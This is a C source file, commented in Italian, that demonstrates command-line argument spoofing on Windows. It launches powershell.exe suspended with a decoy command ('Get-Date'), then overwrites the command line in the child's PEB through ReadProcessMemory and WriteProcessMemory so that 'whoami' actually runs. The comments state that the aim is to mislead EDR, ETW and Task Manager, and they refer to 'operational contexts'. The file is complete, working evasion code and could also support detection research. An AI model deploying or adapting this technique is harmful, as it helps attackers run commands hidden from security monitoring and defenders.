#include <windows.h>
#include <stdio.h>
#include <stddef.h>
#include <wchar.h>

/*
    ============================================================
    STRUTTURE NT NECESSARIE PER ACCEDERE AL PEB DEL PROCESSO
    ============================================================
    Queste strutture non sono completamente esposte nell'SDK
    pubblico di Windows. Vengono ridefinite manualmente perché
    il codice deve accedere direttamente a campi interni del
    kernel, normalmente riservati a ntdll.dll e al SO stesso.
*/

/*
    UNICODE_STRING è il formato stringa nativo del kernel NT.
    A differenza delle stringhe C (null-terminated ASCII),
    il kernel Windows usa UTF-16 con lunghezza esplicita.
    - Length:        byte attualmente usati dal buffer
    - MaximumLength: capacità totale del buffer in byte
    - Buffer:        puntatore ai caratteri wide (wchar_t*)
*/
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

/*
    RTL_USER_PROCESS_PARAMETERS contiene i parametri con cui
    il processo è stato avviato. È allocata nell'address space
    del processo figlio e puntata dal PEB.
    I campi Reserved* coprono dati non rilevanti per questa
    tecnica (es. environment, current directory, ecc.).
    I due campi critici per lo spoofing sono:
    - ImagePathName: percorso dell'eseguibile
    - CommandLine:   argomenti passati al processo (il nostro target)
*/
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

/*
    PEB (Process Environment Block) è la struttura principale
    che il kernel alloca per ogni processo nello user-space.
    Contiene informazioni critiche sul processo:
    - BeingDebugged:      flag anti-debug (usato da IsDebuggerPresent)
    - Ldr:                puntatore alla lista dei moduli caricati
    - ProcessParameters:  puntatore a RTL_USER_PROCESS_PARAMETERS

    Il PEB è accessibile tramite NtQueryInformationProcess oppure
    direttamente via registro FS (x86) o GS (x64).
    È qui che i tool di monitoring (es. Process Hacker, EDR) leggono
    la command line del processo — ed è quindi il target dello spoofing.
*/
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} PEB, *PPEB;

/*
    PROCESS_BASIC_INFORMATION è la struttura restituita da
    NtQueryInformationProcess con classe 0 (ProcessBasicInformation).
    Il campo cruciale è PebBaseAddress: l'indirizzo del PEB
    del processo target nel suo spazio di memoria virtuale.
*/
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

/*
    Puntatore a funzione per NtQueryInformationProcess.
    Questa funzione è non documentata (API nativa NT) e non
    presente direttamente negli header standard. Viene quindi
    caricata dinamicamente da ntdll.dll a runtime tramite
    GetProcAddress, tecnica comune per evitare dipendenze
    statiche da funzioni non ufficiali.
*/
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
    HANDLE,   // handle al processo target
    DWORD,    // classe di informazione richiesta
    PVOID,    // buffer output
    ULONG,    // dimensione buffer
    PULONG    // byte restituiti
);

int main() {
    printf("=================================================\n");
    printf(" Test Argument Spoofing\n");
    printf(" Falso: Get-Date  |  Reale: whoami\n");
    printf("=================================================\n\n");

    /*
        ============================================================
        STEP 1 — CARICA NtQueryInformationProcess DA ntdll.dll
        ============================================================
        ntdll.dll è sempre presente nello spazio di ogni processo
        Windows — è la libreria più bassa accessibile dallo user-mode.
        GetModuleHandleA non carica la DLL (è già mappata), ma
        restituisce il suo handle in memoria.
        GetProcAddress risolve l'indirizzo della funzione a runtime,
        bypassando la necessità di importarla staticamente.
    */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(
            hNtdll,
            "NtQueryInformationProcess"
        );
    if (!NtQueryInformationProcess) {
        printf("Errore caricamento NtQueryInformationProcess\n");
        return 1;
    }

    /*
        ============================================================
        STEP 2 — CREA PIPE ANONIMA PER CATTURARE L'OUTPUT
        ============================================================
        Viene creata una pipe anonima per reindirizzare stdout e
        stderr del processo figlio verso il processo padre. Questa
        componente ci è utile solo ai fini della demo e non è
        necessario in contesti operativi.
        - hReadPipe:  estremo di lettura (usato dal padre)
        - hWritePipe: estremo di scrittura (ereditato dal figlio)

        SECURITY_ATTRIBUTES con bInheritHandle = TRUE è necessario
        affinché il processo figlio possa ereditare hWritePipe.
        SetHandleInformation rimuove il flag di eredità da hReadPipe:
        solo il lato scrittura deve essere ereditato dal figlio,
        non quello di lettura (che rimane privato del padre).
    */
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        printf("CreatePipe failed\n");
        return 1;
    }
    // Rimuove l'ereditabilità dal lato lettura: solo hWritePipe
    // deve essere visibile al processo figlio
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    /*
        ============================================================
        STEP 3 — CREA IL PROCESSO IN STATO SOSPESO CON CMD FALSA
        ============================================================
        Il processo viene creato con CREATE_SUSPENDED: il thread
        principale è bloccato prima di eseguire qualsiasi istruzione.
        Questo è il punto chiave della tecnica: il processo esiste
        nel sistema (ha un PID, un PEB, una command line visibile),
        ma non ha ancora eseguito nulla.

        La command line passata a CreateProcess ("Get-Date") è quella
        "falsa" — quella che vedrà chiunque interroghi il processo
        in questo momento (Task Manager, EDR, ETW, ecc.).

        STARTF_USESTDHANDLES + i campi hStd* redirigono l'output
        del figlio verso la pipe creata allo step 2.

        CREATE_NO_WINDOW evita che appaia una finestra console.
    */
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    // Command line deliberatamente falsa — visibile agli strumenti
    // di monitoraggio che leggono la command line al momento
    // della creazione del processo
    char fakeCmdLine[] =
        "powershell.exe -NoProfile -Command Get-Date";

    printf("[*] CreateProcess con command line FALSA:\n");
    printf("    %s\n\n", fakeCmdLine);

    BOOL result = CreateProcessA(
        NULL,
        fakeCmdLine,          // cmd line falsa nel PEB iniziale
        NULL,
        NULL,
        TRUE,                 // eredita gli handle (necessario per la pipe)
        CREATE_SUSPENDED |    // processo bloccato prima dell'esecuzione
        CREATE_NO_WINDOW,     // nessuna finestra console visibile
        NULL,
        NULL,
        &si,
        &pi
    );
    if (!result) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[OK] Processo creato (sospeso) PID %lu\n\n", pi.dwProcessId);

    /*
        ============================================================
        STEP 4 — OTTIENI L'INDIRIZZO BASE DEL PEB DEL FIGLIO
        ============================================================
        NtQueryInformationProcess con classe 0 (ProcessBasicInformation)
        restituisce tra l'altro PebBaseAddress: l'indirizzo virtuale
        del PEB nell'address space del processo figlio.
        Questo indirizzo sarà usato come punto di partenza per
        navigare le strutture interne tramite ReadProcessMemory.
    */
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        0,           // ProcessBasicInformation
        &pbi,
        sizeof(pbi),
        &retLen
    );
    if (status != 0) {
        printf("NtQueryInformationProcess error\n");
        return 1;
    }
    printf("[OK] PEB address: %p\n", pbi.PebBaseAddress);

    /*
        ============================================================
        STEP 5 — LEGGI IL PUNTATORE A ProcessParameters DAL PEB
        ============================================================
        Il PEB del figlio esiste nella memoria del processo figlio,
        non in quella del padre. Per accedervi si usa ReadProcessMemory.
        Si legge il campo ProcessParameters usando offsetof() per
        calcolare il suo offset esatto nella struttura PEB.
        Il risultato è un puntatore (ancora nel VA space del figlio)
        a RTL_USER_PROCESS_PARAMETERS.
    */
    PVOID pProcessParameters = NULL;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        // indirizzo esatto del campo ProcessParameters nel PEB del figlio
        (BYTE*)pbi.PebBaseAddress + offsetof(PEB, ProcessParameters),
        &pProcessParameters,   // output: puntatore letto dalla memoria del figlio
        sizeof(PVOID),
        &bytesRead
    );

    /*
        ============================================================
        STEP 6 — LEGGI LA STRUTTURA UNICODE_STRING DELLA COMMANDLINE
        ============================================================
        Dalla struttura RTL_USER_PROCESS_PARAMETERS (anch'essa nel
        VA space del figlio) si legge il campo CommandLine.
        La lettura restituisce la struttura UNICODE_STRING completa:
        lunghezza corrente, lunghezza massima e — crucialmente —
        il puntatore cmd.Buffer, che punta al buffer UTF-16
        contenente la command line attuale ("Get-Date") nel figlio.
        È questo buffer che verrà sovrascritto al prossimo step.
    */
    UNICODE_STRING cmd = {0};
    ReadProcessMemory(
        pi.hProcess,
        (BYTE*)pProcessParameters +
            offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine),
        &cmd,           // riceviamo Length, MaximumLength e Buffer
        sizeof(cmd),
        &bytesRead
    );
    printf("[OK] CommandLine buffer: %p\n", cmd.Buffer);

    /*
        ============================================================
        STEP 7 — SOVRASCRIVE IL BUFFER CON LA COMMAND LINE REALE
        ============================================================
        Ora che conosciamo l'indirizzo esatto del buffer UTF-16,
        scriviamo la command line reale ("whoami") direttamente
        nella memoria del processo figlio tramite WriteProcessMemory.

        Il controllo su MaximumLength è fondamentale: il buffer
        allocato ha una dimensione fissa stabilita da CreateProcess.
        Scrivere oltre tale limite corromperebbe memoria adiacente.

        Poiché il processo è ancora sospeso, questa scrittura
        avviene prima che qualsiasi codice del figlio venga eseguito:
        quando il thread riprenderà, leggerà direttamente la stringa
        reale come se fosse sempre stata quella.
    */
    wchar_t realCmd[] =
        L"powershell.exe -NoProfile -Command whoami";
    SIZE_T size = (wcslen(realCmd) + 1) * sizeof(wchar_t);

    if (size > cmd.MaximumLength) {
        printf("Buffer troppo piccolo\n");
        return 1;
    }
    WriteProcessMemory(
        pi.hProcess,
        cmd.Buffer,    // indirizzo del buffer nel VA space del figlio
        realCmd,       // dati da scrivere (UTF-16)
        size,
        &bytesRead
    );

    /*
        ============================================================
        STEP 8 — AGGIORNA IL CAMPO Length DELLA UNICODE_STRING
        ============================================================
        UNICODE_STRING non è null-terminated: la lunghezza della
        stringa è determinata esclusivamente dal campo Length.
        Se non si aggiorna Length dopo aver scritto una stringa
        di dimensione diversa, il sistema userebbe la lunghezza
        vecchia, causando troncamento o lettura di dati errati.
        Si usa WriteProcessMemory per scrivere il nuovo valore
        di Length direttamente nel campo corretto della struttura,
        calcolando l'offset con la doppia applicazione di offsetof.
    */
    USHORT newLen = (USHORT)(wcslen(realCmd) * sizeof(wchar_t));
    WriteProcessMemory(
        pi.hProcess,
        (BYTE*)pProcessParameters +
            offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) +
            offsetof(UNICODE_STRING, Length),
        &newLen,        // nuovo valore di Length in byte
        sizeof(newLen),
        &bytesRead
    );
    printf("[OK] CommandLine spoofata nel PEB\n\n");

    /*
        ============================================================
        STEP 9 — RIPRENDE L'ESECUZIONE DEL PROCESSO
        ============================================================
        ResumeThread sblocca il thread principale del processo figlio.
        Da questo momento il processo esegue normalmente, ma la
        command line che trova nel suo PEB è già quella reale ("whoami").
        Qualsiasi strumento che legga la command line d'ora in poi
        (incluso il processo stesso tramite GetCommandLine) vedrà
        il valore riscritto.

        hWritePipe viene chiuso immediatamente dopo: se non lo si
        chiude, ReadFile nel padre non riceverà mai EOF e si bloccherà
        indefinitamente in attesa di ulteriori dati dalla pipe.
    */
    ResumeThread(pi.hThread);
    CloseHandle(hWritePipe); // fondamentale: segnala EOF al lettore della pipe

    /*
        ============================================================
        STEP 10 — LEGGI E STAMPA L'OUTPUT REALE DAL PROCESSO
        ============================================================
        ReadFile legge in loop dall'estremo di lettura della pipe
        finché il processo figlio non chiude il suo estremo di
        scrittura (cosa che avviene automaticamente alla terminazione).
        L'output mostrato è quello reale del comando eseguito (whoami),
        dimostrando che il processo ha ignorato la command line falsa
        e ha eseguito quella iniettata nel PEB.
    */
    printf("Output reale (whoami):\n");
    printf("----------------------\n");
    char buffer[4096];
    DWORD read;
    while (ReadFile(
        hReadPipe,
        buffer,
        sizeof(buffer)-1,
        &read,
        NULL) && read > 0)
    {
        buffer[read] = 0;  // terminazione manuale della stringa
        printf("%s", buffer);
    }
    printf("\n----------------------\n");

    /*
        ============================================================
        STEP 11 — CLEANUP DELLE RISORSE
        ============================================================
        WaitForSingleObject attende la terminazione del processo
        figlio prima di chiudere gli handle — evita race condition
        in cui il padre termina prima che il figlio finisca di
        scrivere sulla pipe.
        Tutti gli handle aperti vengono chiusi per rilasciare
        le risorse al sistema operativo.
    */
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("\nTest completato.\n");
    getchar(); // pausa prima di chiudere la console
    return 0;
}